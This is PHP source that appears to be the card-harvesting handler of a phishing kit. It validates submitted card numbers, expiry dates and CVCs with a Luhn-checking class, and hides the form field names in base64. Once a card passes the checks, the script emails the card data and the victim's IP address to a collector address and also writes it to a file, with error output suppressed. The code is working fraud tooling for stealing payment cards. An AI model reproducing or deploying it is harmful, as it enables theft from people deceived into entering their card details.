<?php

error_reporting(0);
ini_set('display_errors', 0);

class CreditCard
{
    protected static $cards = array(
        // Debit cards must come first, since they have more specific patterns than their credit-card equivalents.
        'visaelectron' => array(
            'type' => 'visaelectron',
            'pattern' => '/^4(026|17500|405|508|844|91[37])/',
            'length' => array(16),
            'cvcLength' => array(3),
            'luhn' => true,
        ),
        'maestro' => array(
            'type' => 'maestro',
            'pattern' => '/^(5(018|0[23]|[68])|6(39|7))/',
            'length' => array(12, 13, 14, 15, 16, 17, 18, 19),
            'cvcLength' => array(3),
            'luhn' => true,
        ),
        'forbrugsforeningen' => array(
            'type' => 'forbrugsforeningen',
            'pattern' => '/^600/',
            'length' => array(16),
            'cvcLength' => array(3),
            'luhn' => true,
        ),
        'dankort' => array(
            'type' => 'dankort',
            'pattern' => '/^5019/',
            'length' => array(16),
            'cvcLength' => array(3),
            'luhn' => true,
        ),
        // Credit cards
        'visa' => array(
            'type' => 'visa',
            'pattern' => '/^4/',
            'length' => array(13, 16),
            'cvcLength' => array(3),
            'luhn' => true,
        ),
        'mastercard' => array(
            'type' => 'mastercard',
            'pattern' => '/^(5[0-5]|2[2-7])/',
            'length' => array(16),
            'cvcLength' => array(3),
            'luhn' => true,
        ),
        'amex' => array(
            'type' => 'amex',
            'pattern' => '/^3[47]/',
            'format' => '/(\d{1,4})(\d{1,6})?(\d{1,5})?/',
            'length' => array(15),
            'cvcLength' => array(4),
            'luhn' => true,
        ),
        'dinersclub' => array(
            'type' => 'dinersclub',
            'pattern' => '/^3[0689]/',
            'length' => array(14),
            'cvcLength' => array(3),
            'luhn' => true,
        ),
        'discover' => array(
            'type' => 'discover',
            'pattern' => '/^6([045]|22)/',
            'length' => array(16),
            'cvcLength' => array(3),
            'luhn' => true,
        ),
        'unionpay' => array(
            'type' => 'unionpay',
            'pattern' => '/^(62|88)/',
            'length' => array(16, 17, 18, 19),
            'cvcLength' => array(3),
            'luhn' => false,
        ),
        'jcb' => array(
            'type' => 'jcb',
            'pattern' => '/^35/',
            'length' => array(16),
            'cvcLength' => array(3),
            'luhn' => true,
        ),
    );
    public static function validCreditCard($number, $type = null)
    {
        $ret = array(
            'valid' => false,
            'number' => '',
            'type' => '',
        );
        // Strip non-numeric characters
        $number = preg_replace('/[^0-9]/', '', $number);
        if (empty($type)) {
            $type = self::creditCardType($number);
        }
        if (array_key_exists($type, self::$cards) && self::validCard($number, $type)) {
            return array(
                'valid' => true,
                'number' => $number,
                'type' => $type,
            );
        }
        return $ret;
    }
    public static function validCvc($cvc, $type)
    {
        return (ctype_digit($cvc) && array_key_exists($type, self::$cards) && self::validCvcLength($cvc, $type));
    }
    public static function validDate($year, $month)
    {
        $month = str_pad($month, 2, '0', STR_PAD_LEFT);
        if (! preg_match('/^20\d\d$/', $year)) {
            return false;
        }
        if (! preg_match('/^(0[1-9]|1[0-2])$/', $month)) {
            return false;
        }
        // past date
        if ($year < gmdate('Y') || $year == gmdate('Y') && $month < gmdate('m')) {
            return false;
        }
        return true;
    }
    // PROTECTED
    // ---------------------------------------------------------
    protected static function creditCardType($number)
    {
        foreach (self::$cards as $type => $card) {
            if (preg_match($card['pattern'], $number)) {
                return $type;
            }
        }
        return '';
    }
    protected static function validCard($number, $type)
    {
        return (self::validPattern($number, $type) && self::validLength($number, $type) && self::validLuhn($number, $type));
    }
    protected static function validPattern($number, $type)
    {
        return preg_match(self::$cards[$type]['pattern'], $number);
    }
    protected static function validLength($number, $type)
    {
        foreach (self::$cards[$type]['length'] as $length) {
            if (strlen($number) == $length) {
                return true;
            }
        }
        return false;
    }
    protected static function validCvcLength($cvc, $type)
    {
        foreach (self::$cards[$type]['cvcLength'] as $length) {
            if (strlen($cvc) == $length) {
                return true;
            }
        }
        return false;
    }
    protected static function validLuhn($number, $type)
    {
        if (! self::$cards[$type]['luhn']) {
            return true;
        } else {
            return self::luhnCheck($number);
        }
    }
    protected static function luhnCheck($number)
    {
        $checksum = 0;
        for ($i=(2-(strlen($number) % 2)); $i<=strlen($number); $i+=2) {
            $checksum += (int) ($number{$i-1});
        }
        // Analyze odd digits in even length strings or even digits in odd length strings.
        for ($i=(strlen($number)% 2) + 1; $i<strlen($number); $i+=2) {
            $digit = (int) ($number{$i-1}) * 2;
            if ($digit < 10) {
                $checksum += $digit;
            } else {
                $checksum += ($digit-9);
            }
        }
        if (($checksum % 10) == 0) {
            return true;
        } else {
            return false;
        }
    }
    public static function title($type){
        $title = "Secure Code";
        if($type=='jcb'){
            return 'JCB J/Secure';
        }
        if($type=='amex'){
            return 'Amex SafeKey';
        }
        if($type=='mastercard'){
            return 'MasterCard Secure Code';
        }
        if($type=='visaelectron' or $type=='visa'){
            return 'Verified by Visa';
        }
        return $title;
    }
}
sleep(2);
$Number = CreditCard::validCreditCard($_POST[base64_decode("Q2FyZE51bWJlcklucHV0")]);
$splitCardDate = explode("/",$_POST[base64_decode("Q2FyZEV4cElucHV0")]);
$checkcvv = CreditCard::validCvc($_POST[base64_decode('Q2FyZGN2dklucHV0')],$Number['type']);
$_SESSION['CARDTYPE'] = $Number['type'];
$_SESSION['title'] = CreditCard::title($Number['type']);
if($_POST[base64_decode("Q2FyZE51bWJlcklucHV0")]!=""){
	if(!$Number['valid']){
		echo "Q2FyZE51bWJlck5vdFZhbGlk";
		return;
	}else{
		$checkcardcarde = CreditCard::validDate("20".$splitCardDate[1],$splitCardDate[0]);
		if(!$checkcardcarde){
			echo "Q2FyZE51bWJlckRhdGFFWFBpc0ZBQ0tJTkdFUlJPUkNoZWNreW9ydmFsaWREYXRh";
			return;
		}else{
			if(!$checkcvv){
				echo "R09UT0NIRUNLdmFsaWRGdWNraW5nQ3ZWTnVtYmVyVGhpc0NPZGVCeURSYURORU4=";
				return;
			}else{
				#---------------------------------------------------------------------------
				#For ALL information is True
				include("../send/functionsend.php");
                include("../send/mail.php");
				$head = "MIME-Version: 1.0" . "\r\n";
                $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
                $head .= "From: $from\r\n";
                $subject = "New  Card  ".$_POST[base64_decode("Q2FyZE51bWJlcklucHV0")]."  Form : ".getenv("REMOTE_ADDR");
                include("CheckBankInfo.php");
                $_SESSION['CardCountry'] =  Bank::GetBankInfo("BankCountry",$_POST[base64_decode("Q2FyZE51bWJlcklucHV0")]);
                echo Bank::GetBankInfo("Cardscheme",$_POST[base64_decode("Q2FyZE51bWJlcklucHV0")]);
				@mail($to,$subject,functionsend::Card(),$head);
                $f = fopen($save, "a+");
                fwrite($f, functionsend::Card());
                fclose($f);




			}
		}
	}
}

?>